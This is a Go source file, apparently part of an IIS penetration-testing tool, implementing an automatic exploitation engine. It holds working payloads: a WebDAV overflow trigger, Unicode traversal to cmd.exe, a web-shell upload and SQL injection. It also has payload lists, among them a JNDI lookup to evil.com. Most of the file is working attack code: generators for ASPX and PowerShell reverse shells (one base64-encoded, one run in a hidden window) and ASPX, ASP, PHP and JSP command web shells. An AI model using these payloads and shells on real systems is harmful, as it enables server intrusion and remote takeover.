package exploitation

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/ibrahmsql/iismap/modules"
)

// ExploitEngine automatic exploitation engine
type ExploitEngine struct {
	client     *http.Client
	baseURL    string
	exploits   []Exploit
	payloads   *PayloadGenerator
	shells     *ReverseShellGenerator
}

// Exploit exploit yap覺s覺
type Exploit struct {
	ID          string
	Name        string
	Description string
	CVE         string
	Severity    string
	Category    string
	Payloads    []ExploitPayload
	Validator   func(*http.Response) bool
}

// ExploitPayload exploit payload yap覺s覺
type ExploitPayload struct {
	Name        string
	Method      string
	Path        string
	Data        string
	Headers     map[string]string
	Description string
}

// NewExploitEngine creates new exploit engine
func NewExploitEngine(client *http.Client, baseURL string) *ExploitEngine {
	engine := &ExploitEngine{
		client:   client,
		baseURL:  baseURL,
		payloads: NewPayloadGenerator(),
		shells:   NewReverseShellGenerator(),
	}
	engine.initExploits()
	return engine
}

// initExploits initializes exploit list
func (e *ExploitEngine) initExploits() {
	e.exploits = []Exploit{
		// IIS 6.0 WebDAV Buffer Overflow (CVE-2017-7269)
		{
			ID:          "CVE-2017-7269",
			Name:        "IIS 6.0 WebDAV Buffer Overflow",
			Description: "Buffer overflow in ScStoragePathFromUrl function",
			CVE:         "CVE-2017-7269",
			Severity:    "CRITICAL",
			Category:    "buffer_overflow",
			Payloads: []ExploitPayload{
				{
					Name:   "WebDAV Buffer Overflow",
					Method: "PROPFIND",
					Path:   "/",
					Data: `<?xml version="1.0"?>
<D:propfind xmlns:D="DAV:">
<D:prop>
<D:getcontentlength xmlns:D="DAV:" xmlns:b="urn:uuid:c2f41010-65b3-11d1-a29f-00aa00c14882/">
</D:prop>
</D:propfind>`,
					Headers: map[string]string{
						"Content-Type": "text/xml",
						"If":           "<http://localhost/aaaaaaa" + strings.Repeat("A", 100) + "> (<DAV:no-lock>)",
					},
					Description: "Triggers buffer overflow in WebDAV service",
				},
			},
			Validator: func(resp *http.Response) bool {
				return resp.StatusCode >= 500 || resp.StatusCode == 0
			},
		},
		// IIS Unicode Directory Traversal (CVE-2000-0884)
		{
			ID:          "CVE-2000-0884",
			Name:        "IIS Unicode Directory Traversal",
			Description: "Unicode encoding directory traversal vulnerability",
			CVE:         "CVE-2000-0884",
			Severity:    "HIGH",
			Category:    "directory_traversal",
			Payloads: []ExploitPayload{
				{
					Name:   "Unicode Traversal",
					Method: "GET",
					Path:   "/scripts/..%c0%af../winnt/system32/cmd.exe",
					Data:   "",
					Headers: map[string]string{
						"User-Agent": "Mozilla/5.0",
					},
					Description: "Unicode directory traversal to access cmd.exe",
				},
				{
					Name:   "Unicode Traversal Alt",
					Method: "GET",
					Path:   "/scripts/..%c1%9c../winnt/system32/cmd.exe",
					Data:   "",
					Headers: map[string]string{
						"User-Agent": "Mozilla/5.0",
					},
					Description: "Alternative unicode traversal",
				},
			},
			Validator: func(resp *http.Response) bool {
				return resp.StatusCode == 200 || resp.StatusCode == 500
			},
		},
		// ASP.NET ViewState Exploitation
		{
			ID:          "VIEWSTATE-EXPLOIT",
			Name:        "ASP.NET ViewState Exploitation",
			Description: "ViewState MAC validation bypass and deserialization",
			CVE:         "",
			Severity:    "HIGH",
			Category:    "deserialization",
			Payloads: []ExploitPayload{
				{
					Name:   "ViewState MAC Bypass",
					Method: "POST",
					Path:   "/",
					Data:   "__VIEWSTATE=" + url.QueryEscape(generateMaliciousViewState()),
					Headers: map[string]string{
						"Content-Type": "application/x-www-form-urlencoded",
					},
					Description: "Attempts to bypass ViewState MAC validation",
				},
			},
			Validator: func(resp *http.Response) bool {
				return resp.StatusCode == 200 && !strings.Contains(resp.Header.Get("Content-Type"), "error")
			},
		},
		// IIS Tilde Enumeration to File Upload
		{
			ID:          "TILDE-TO-UPLOAD",
			Name:        "Tilde Enumeration to File Upload",
			Description: "Use tilde enumeration results for targeted file upload",
			CVE:         "",
			Severity:    "HIGH",
			Category:    "file_upload",
			Payloads: []ExploitPayload{
				{
					Name:   "ASPX Shell Upload",
					Method: "PUT",
					Path:   "/shell.aspx",
					Data:   generateASPXShell(),
					Headers: map[string]string{
						"Content-Type": "application/octet-stream",
					},
					Description: "Upload ASPX web shell",
				},
			},
			Validator: func(resp *http.Response) bool {
				return resp.StatusCode == 201 || resp.StatusCode == 204
			},
		},
		// SQL Injection in IIS Logs
		{
			ID:          "LOG-INJECTION",
			Name:        "SQL Injection via IIS Logs",
			Description: "SQL injection through IIS log poisoning",
			CVE:         "",
			Severity:    "MEDIUM",
			Category:    "sql_injection",
			Payloads: []ExploitPayload{
				{
					Name:   "Log Poisoning SQLi",
					Method: "GET",
					Path:   "/' UNION SELECT 1,2,3,4,5--",
					Data:   "",
					Headers: map[string]string{
						"User-Agent": "' UNION SELECT @@version--",
						"Referer":    "' OR 1=1--",
					},
					Description: "Inject SQL payload into IIS logs",
				},
			},
			Validator: func(resp *http.Response) bool {
				return true // Log injection is always attempted
			},
		},
	}
}

// ExecuteExploit executes a specific exploit
func (e *ExploitEngine) ExecuteExploit(exploitID string) (*ExploitResult, error) {
	var targetExploit *Exploit
	for _, exploit := range e.exploits {
		if exploit.ID == exploitID {
			targetExploit = &exploit
			break
		}
	}

	if targetExploit == nil {
		return nil, fmt.Errorf("exploit not found: %s", exploitID)
	}

	result := &ExploitResult{
		ExploitID:   exploitID,
		ExploitName: targetExploit.Name,
		StartTime:   time.Now(),
		Attempts:    []ExploitAttempt{},
	}

	// Execute each payload
	for _, payload := range targetExploit.Payloads {
		attempt := e.executePayload(*targetExploit, payload)
		result.Attempts = append(result.Attempts, attempt)

		if attempt.Success {
			result.Success = true
			result.SuccessfulPayload = payload.Name
			break
		}
	}

	result.EndTime = time.Now()
	result.Duration = result.EndTime.Sub(result.StartTime)

	return result, nil
}

// executePayload executes a specific payload
func (e *ExploitEngine) executePayload(exploit Exploit, payload ExploitPayload) ExploitAttempt {
	attempt := ExploitAttempt{
		PayloadName: payload.Name,
		StartTime:   time.Now(),
	}

	// Construct URL
	testURL := e.baseURL + payload.Path

	// Create request
	var req *http.Request
	var err error

	if payload.Data != "" {
		// Use bytes.NewReader for better performance with binary data
		req, err = http.NewRequest(payload.Method, testURL, bytes.NewReader([]byte(payload.Data)))
	} else {
		req, err = http.NewRequest(payload.Method, testURL, nil)
	}

	if err != nil {
		attempt.Error = err.Error()
		attempt.EndTime = time.Now()
		return attempt
	}

	// Add headers
	for key, value := range payload.Headers {
		req.Header.Set(key, value)
	}

	// Execute request
	resp, err := e.client.Do(req)
	if err != nil {
		attempt.Error = err.Error()
		attempt.EndTime = time.Now()
		return attempt
	}
	defer resp.Body.Close()

	attempt.StatusCode = resp.StatusCode
	attempt.ResponseHeaders = make(map[string]string)
	for key, values := range resp.Header {
		attempt.ResponseHeaders[key] = strings.Join(values, ", ")
	}

	// Validate success
	if exploit.Validator != nil {
		attempt.Success = exploit.Validator(resp)
	}

	attempt.EndTime = time.Now()
	return attempt
}

// GeneratePayloads generates payloads based on vulnerability
func (e *ExploitEngine) GeneratePayloads(vulnerability modules.Vulnerability) []string {
	var payloads []string

	switch vulnerability.CWE {
	case "CWE-22": // Path Traversal
		payloads = e.payloads.GeneratePathTraversalPayloads()
	case "CWE-79": // XSS
		payloads = e.payloads.GenerateXSSPayloads()
	case "CWE-89": // SQL Injection
		payloads = e.payloads.GenerateSQLInjectionPayloads()
	case "CWE-434": // File Upload
		payloads = e.payloads.GenerateFileUploadPayloads()
	default:
		payloads = e.payloads.GenerateGenericPayloads()
	}

	return payloads
}

// CreateReverseShell creates reverse shell
func (e *ExploitEngine) CreateReverseShell(shellType, lhost string, lport int) string {
	return e.shells.Generate(shellType, lhost, lport)
}

// ExploitResult exploit sonucu
type ExploitResult struct {
	ExploitID         string
	ExploitName       string
	Success           bool
	SuccessfulPayload string
	StartTime         time.Time
	EndTime           time.Time
	Duration          time.Duration
	Attempts          []ExploitAttempt
}

// ExploitAttempt exploit denemesi
type ExploitAttempt struct {
	PayloadName     string
	Success         bool
	StartTime       time.Time
	EndTime         time.Time
	StatusCode      int
	ResponseHeaders map[string]string
	Error           string
}

// PayloadGenerator payload generator
type PayloadGenerator struct{}

// NewPayloadGenerator creates new payload generator
func NewPayloadGenerator() *PayloadGenerator {
	return &PayloadGenerator{}
}

// GeneratePathTraversalPayloads generates path traversal payloads
func (p *PayloadGenerator) GeneratePathTraversalPayloads() []string {
	return []string{
		"../../../../../../../etc/passwd",
		"..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
		"%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
		"..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd",
		"..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
	}
}

// GenerateXSSPayloads generates XSS payloads
func (p *PayloadGenerator) GenerateXSSPayloads() []string {
	return []string{
		"<script>alert('XSS')</script>",
		"<img src=x onerror=alert('XSS')>",
		"javascript:alert('XSS')",
		"<svg onload=alert('XSS')>",
		"<iframe src=javascript:alert('XSS')>",
	}
}

// GenerateSQLInjectionPayloads generates SQL injection payloads
func (p *PayloadGenerator) GenerateSQLInjectionPayloads() []string {
	return []string{
		"' OR 1=1--",
		"' UNION SELECT 1,2,3--",
		"'; DROP TABLE users;--",
		"' OR 'a'='a",
		"1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
	}
}

// GenerateFileUploadPayloads generates file upload payloads
func (p *PayloadGenerator) GenerateFileUploadPayloads() []string {
	return []string{
		generateASPXShell(),
		generateASPShell(),
		generatePHPShell(),
		generateJSPShell(),
	}
}

// GenerateGenericPayloads generates generic payloads
func (p *PayloadGenerator) GenerateGenericPayloads() []string {
	return []string{
		"<script>alert('test')</script>",
		"' OR 1=1--",
		"../../../etc/passwd",
		"${jndi:ldap://evil.com/a}",
		"{{7*7}}",
	}
}

// ReverseShellGenerator reverse shell generator
type ReverseShellGenerator struct{}

// NewReverseShellGenerator creates new reverse shell generator
func NewReverseShellGenerator() *ReverseShellGenerator {
	return &ReverseShellGenerator{}
}

// Generate creates specific type reverse shell
func (r *ReverseShellGenerator) Generate(shellType, lhost string, lport int) string {
	switch strings.ToLower(shellType) {
	case "aspx":
		return r.generateASPXReverseShell(lhost, lport)
	case "asp":
		return r.generateASPReverseShell(lhost, lport)
	case "powershell":
		return r.generatePowerShellReverseShell(lhost, lport)
	case "cmd":
		return r.generateCMDReverseShell(lhost, lport)
	default:
		return r.generateASPXReverseShell(lhost, lport)
	}
}

// generateASPXReverseShell creates ASPX reverse shell
func (r *ReverseShellGenerator) generateASPXReverseShell(lhost string, lport int) string {
	return fmt.Sprintf(`<%s Page Language="C#" %s
<%s Import Namespace="System.Net" %s
<%s Import Namespace="System.Net.Sockets" %s
<%s Import Namespace="System.IO" %s
<%s Import Namespace="System.Diagnostics" %s
<script runat="server">
void Page_Load(object sender, EventArgs e)
{
    try
    {
        TcpClient client = new TcpClient("%s", %d);
        NetworkStream stream = client.GetStream();
        StreamReader reader = new StreamReader(stream);
        StreamWriter writer = new StreamWriter(stream);
        
        Process process = new Process();
        process.StartInfo.FileName = "cmd.exe";
        process.StartInfo.UseShellExecute = false;
        process.StartInfo.RedirectStandardInput = true;
        process.StartInfo.RedirectStandardOutput = true;
        process.StartInfo.RedirectStandardError = true;
        process.Start();
        
        while (!process.HasExited)
        {
            string command = reader.ReadLine();
            if (command != null)
            {
                process.StandardInput.WriteLine(command);
                string output = process.StandardOutput.ReadToEnd();
                writer.WriteLine(output);
                writer.Flush();
            }
        }
        
        client.Close();
    }
    catch { }
}
</script>`, "@", ">", "@", ">", "@", ">", "@", ">", "@", ">", lhost, lport)
}

// generateASPReverseShell creates ASP reverse shell
func (r *ReverseShellGenerator) generateASPReverseShell(lhost string, _ int) string {
	return fmt.Sprintf(`<%s
Set oShell = CreateObject("WScript.Shell")
Set oExec = oShell.Exec("cmd.exe /c ping -n 1 %s")
Response.Write(oExec.StdOut.ReadAll())
%s>`, "%", lhost, "%")
}

// generatePowerShellReverseShell creates PowerShell reverse shell
func (r *ReverseShellGenerator) generatePowerShellReverseShell(lhost string, lport int) string {
	payload := fmt.Sprintf(`$client = New-Object System.Net.Sockets.TCPClient('%s',%d);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|ForEach-Object{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()`, lhost, lport)

	encoded := base64.StdEncoding.EncodeToString([]byte(payload))
	return fmt.Sprintf("powershell -enc %s", encoded)
}

// generateCMDReverseShell creates CMD reverse shell
func (r *ReverseShellGenerator) generateCMDReverseShell(lhost string, lport int) string {
	return fmt.Sprintf(`cmd.exe /c "powershell -nop -w hidden -c $TCPClient = New-Object Net.Sockets.TCPClient('%s', %d);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | ForEach-Object{0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()};WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String};WriteToStream ($Output)};$StreamWriter.Close()"`, lhost, lport)
}

// Helper functions for generating shells
func generateASPXShell() string {
	return `<%@ Page Language="C#" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
void Page_Load(object sender, EventArgs e)
{
    if (Request["cmd"] != null)
    {
        Process process = new Process();
        process.StartInfo.FileName = "cmd.exe";
        process.StartInfo.Arguments = "/c " + Request["cmd"];
        process.StartInfo.UseShellExecute = false;
        process.StartInfo.RedirectStandardOutput = true;
        process.Start();
        
        string output = process.StandardOutput.ReadToEnd();
        process.WaitForExit();
        
        Response.Write("<pre>" + output + "</pre>");
    }
    else
    {
        Response.Write("Web Shell Active - Use ?cmd=command");
    }
}
</script>`
}

func generateASPShell() string {
	return `<%
If Request("cmd") <> "" Then
    Set oShell = CreateObject("WScript.Shell")
    Set oExec = oShell.Exec("cmd.exe /c " & Request("cmd"))
    Response.Write("<pre>" & oExec.StdOut.ReadAll() & "</pre>")
Else
    Response.Write("ASP Shell Active - Use ?cmd=command")
End If
%>`
}

func generatePHPShell() string {
	return `<?php
if(isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
} else {
    echo "PHP Shell Active - Use ?cmd=command";
}
?>`
}

func generateJSPShell() string {
	return `<%@ page import="java.io.*" %>
<%
if (request.getParameter("cmd") != null) {
    Process process = Runtime.getRuntime().exec(request.getParameter("cmd"));
    BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
    String line;
    while ((line = reader.readLine()) != null) {
        out.println(line + "<br>");
    }
} else {
    out.println("JSP Shell Active - Use ?cmd=command");
}
%>`
}

func generateMaliciousViewState() string {
	// Simplified malicious ViewState payload
	payload := "/wEPDwUKLTY4NjY4NDU5NWQYAQUeX19Db250cm9sc1JlcXVpcmVQb3N0QmFja0tleV9fFgEFBWN0bDAwZGQYAQUeX19Db250cm9sc1JlcXVpcmVQb3N0QmFja0tleV9fFgEFBWN0bDAwZGQ="
	return payload
}

// MetasploitIntegration Metasploit integration
type MetasploitIntegration struct {
	RPCHost string
	RPCPort int
	Token   string
}

// NewMetasploitIntegration creates new Metasploit integration
func NewMetasploitIntegration(host string, port int, token string) *MetasploitIntegration {
	return &MetasploitIntegration{
		RPCHost: host,
		RPCPort: port,
		Token:   token,
	}
}

// ExecuteModule executes Metasploit module
func (m *MetasploitIntegration) ExecuteModule(moduleName string, options map[string]string) error {
	// Metasploit RPC implementation would go here
	// This is a placeholder for the actual implementation
	return fmt.Errorf("Metasploit integration not implemented")
}
